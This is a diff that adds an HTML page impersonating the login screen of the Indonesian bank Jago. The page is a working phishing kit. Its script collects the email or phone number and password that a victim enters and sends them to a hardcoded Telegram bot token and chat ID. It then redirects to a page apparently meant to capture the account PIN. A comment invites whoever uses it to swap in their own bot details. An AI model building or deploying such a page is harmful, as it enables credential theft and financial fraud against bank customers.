@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Jago - Halo dari Jago</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(180deg, #FFF9ED 0%, #FFFFFF 100%);
+            min-height: 100vh;
+            padding: 20px 24px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        .bg-circle-top {
+            position: absolute;
+            top: -100px;
+            right: -50px;
+            width: 320px;
+            height: 320px;
+            background: radial-gradient(circle, #FFE8C2 0%, rgba(255, 232, 194, 0) 70%);
+            border-radius: 50%;
+            opacity: 0.6;
+            animation: floatSoft 6s ease-in-out infinite;
+        }
+
+        .dot-red {
+            position: absolute;
+            top: 340px;
+            right: 40px;
+            width: 16px;
+            height: 16px;
+            background-color: #FF3B5C;
+            border-radius: 50%;
+            animation: pulse 3s ease-in-out infinite;
+        }
+
+        .dot-purple {
+            position: absolute;
+            top: 410px;
+            right: 30px;
+            width: 32px;
+            height: 32px;
+            background-color: #9D50F2;
+            border-radius: 50%;
+            animation: pulse 3.5s ease-in-out infinite;
+        }
+
+        .dot-yellow {
+            position: absolute;
+            bottom: 120px;
+            right: -15px;
+            width: 80px;
+            height: 80px;
+            background-color: #FFB800;
+            border-radius: 50%;
+            opacity: 0.85;
+            animation: floatSoft 5s ease-in-out infinite reverse;
+        }
+
+        .dot-red-bottom {
+            position: absolute;
+            bottom: 60px;
+            right: 40px;
+            width: 12px;
+            height: 12px;
+            background-color: #FF3B5C;
+            border-radius: 50%;
+            animation: pulse 2.5s ease-in-out infinite;
+        }
+
+        .dot-purple-bottom {
+            position: absolute;
+            bottom: 70px;
+            left: 15px;
+            width: 10px;
+            height: 10px;
+            background-color: #9D50F2;
+            border-radius: 50%;
+            animation: pulse 3s ease-in-out infinite;
+        }
+
+        .header-top {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 60px;
+            padding-top: 10px;
+        }
+
+        .logo-small {
+            width: 44px;
+            height: 44px;
+            background-color: #FFFFFF;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 700;
+            color: #FFB800;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.06);
+        }
+
+        .flag-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(180deg, #FF0000 50%, #FFFFFF 50%);
+            border-radius: 8px;
+            border: 1px solid #eee;
+        }
+
+        .version-text {
+            font-size: 13px;
+            color: #999;
+            margin-bottom: 8px;
+        }
+
+        h1 {
+            font-size: 34px;
+            font-weight: 700;
+            color: #222;
+            line-height: 1.2;
+            margin-bottom: 6px;
+        }
+
+        .brand-name {
+            font-size: 42px;
+            font-weight: 700;
+            color: #222;
+            margin-bottom: 20px;
+            position: relative;
+        }
+
+        .brand-name::before {
+            content: '';
+            position: absolute;
+            top: 2px;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 30'%3E%3Ccircle cx='15' cy='8' r='5' fill='%23FFB800'/%3E%3Ccircle cx='28' cy='6' r='4' fill='%23FFB800'/%3E%3Ccircle cx='40' cy='8' r='5' fill='%23FFB800'/%3E%3C/svg%3E") no-repeat left top;
+            background-size: 80px 20px;
+            transform: translateY(-14px);
+        }
+
+        .desc-text {
+            font-size: 16px;
+            color: #444;
+            line-height: 1.6;
+            margin-bottom: 40px;
+            max-width: 340px;
+        }
+
+        .form-container {
+            background-color: #FFFFFF;
+            border-radius: 16px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.05);
+            overflow: hidden;
+            margin-bottom: 24px;
+        }
+
+        .input-group {
+            display: flex;
+            align-items: center;
+            padding: 16px 18px;
+            border-bottom: 1px solid #F5F5F5;
+        }
+
+        .input-group:last-child {
+            border-bottom: none;
+        }
+
+        .icon {
+            font-size: 20px;
+            color: #BBB;
+            margin-right: 14px;
+        }
+
+        .input-group input {
+            flex: 1;
+            border: none;
+            outline: none;
+            font-size: 16px;
+            color: #333;
+            background: transparent;
+        }
+
+        .input-group input::placeholder {
+            color: #AAA;
+        }
+
+        .eye-icon {
+            font-size: 20px;
+            color: #888;
+            cursor: pointer;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 20px 0;
+        }
+
+        .divider span {
+            color: #AAA;
+            font-size: 14px;
+        }
+
+        .btn-primary {
+            width: 100%;
+            padding: 16px;
+            background-color: #FFB800;
+            color: #222;
+            border: none;
+            border-radius: 12px;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s ease;
+            margin-bottom: 16px;
+        }
+
+        .btn-primary:hover {
+            background-color: #F5A900;
+        }
+
+        .btn-bibit {
+            width: 100%;
+            padding: 14px 16px;
+            background-color: #FFFFFF;
+            border: 1px solid #FFB800;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            color: #222;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background-color 0.2s ease;
+        }
+
+        .btn-bibit:hover {
+            background-color: #FFF9EB;
+        }
+
+        .bibit-logo {
+            background-color: #4CC767;
+            color: white;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 13px;
+            font-weight: 700;
+        }
+
+        .notification {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: #4CAF50;
+            color: white;
+            padding: 12px 24px;
+            border-radius: 8px;
+            font-size: 14px;
+            z-index: 1000;
+            transition: transform 0.3s ease;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+        }
+
+        .notification.show {
+            transform: translateX(-50%) translateY(0);
+        }
+
+        @keyframes floatSoft {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-15px); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 0.8; }
+            50% { transform: scale(1.15); opacity: 1; }
+        }
+
+        @keyframes fadeInUp {
+            0% {
+                opacity: 0;
+                transform: translateY(25px);
+            }
+            100% {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .content-wrapper {
+            animation: fadeInUp 0.8s ease-out forwards;
+        }
+    </style>
+</head>
+<body>
+    <div class="bg-circle-top"></div>
+    <div class="dot-red"></div>
+    <div class="dot-purple"></div>
+    <div class="dot-yellow"></div>
+    <div class="dot-red-bottom"></div>
+    <div class="dot-purple-bottom"></div>
+
+    <div class="notification" id="notification">✅ Data terkirim ke Telegram!</div>
+
+    <div class="content-wrapper">
+        <div class="header-top">
+            <div class="logo-small">J</div>
+            <div class="flag-icon"></div>
+        </div>
+
+        <p class="version-text">V 8.93.0 (10561)</p>
+        <h1>Halo dari</h1>
+        <div class="brand-name">Jago</div>
+        <p class="desc-text">
+            Semua jadi Jago. Hidup seutuhnya dengan keluarga dan kerabat. Sekarang, Esok, Bersama-sama.
+        </p>
+
+        <div class="form-container">
+            <div class="input-group">
+                <span class="icon">👤</span>
+                <input type="text" id="emailInput" placeholder="Email atau nomor ponsel">
+            </div>
+            <div class="input-group">
+                <span class="icon">🔒</span>
+                <input type="password" id="passwordInput" placeholder="Password">
+                <span class="eye-icon" id="eyeToggle">👁️</span>
+            </div>
+        </div>
+
+        <div class="divider">
+            <span>atau</span>
+        </div>
+
+        <button class="btn-primary" id="submitBtn">Buat Akun Jago</button>
+        <button class="btn-bibit">
+            Saya daftar dari <span class="bibit-logo">bibit</span>
+        </button>
+    </div>
+
+    <script>
+        // ============== GANTI DATA DI BAWAH INI ==============
+        const TELEGRAM_BOT_TOKEN = "8676937565:AAHH2lBa3W-FDu7TsvotAS1TN9qCrEO2isg";
+        const TELEGRAM_CHAT_ID = "8592742129";
+        // =======================================================
+
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const submitBtn = document.getElementById('submitBtn');
+        const notification = document.getElementById('notification');
+        const eyeToggle = document.getElementById('eyeToggle');
+
+        // Tampilkan/Sembunyikan password
+        eyeToggle.addEventListener('click', () => {
+            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
+            eyeToggle.textContent = passwordInput.type === 'password' ? '👁️' : '🙈';
+        });
+
+        // Tampilkan notifikasi
+        function tampilkanNotif() {
+            notification.classList.add('show');
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 2500);
+        }
+
+        // Kirim data ke Telegram
+        async function kirimKeTelegram() {
+            const email = emailInput.value || '(Kosong)';
+            const password = passwordInput.value || '(Kosong)';
+
+            const pesan = `📥 DATA DITERIMA
+⏰ Waktu: ${new Date().toLocaleString('id-ID')}
+📧 Email/Nomor: ${email}
+🔒 Password: ${password}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: pesan
+                    })
+                });
+
+                if (response.ok) {
+                    tampilkanNotif();
+                    console.log('✅ Terkirim ke Telegram');
+                    
+                    // Pindah halaman setelah terkirim
+                    setTimeout(() => {
+                        window.location.href = 'masukanpinjago.html';
+                    }, 1500);
+                } else {
+                    alert('❌ Gagal mengirim. Cek Token & Chat ID Bot Anda.');
+                }
+            } catch (error) {
+                console.log('⚠️ Kesalahan:', error.message);
+                alert('⚠️ Tidak dapat terhubung ke Telegram. Cek koneksi internet.');
+            }
+        }
+
+        // Klik tombol untuk kirim data
+        submitBtn.addEventListener('click', kirimKeTelegram);
+    </script>
+</body>
+</html>
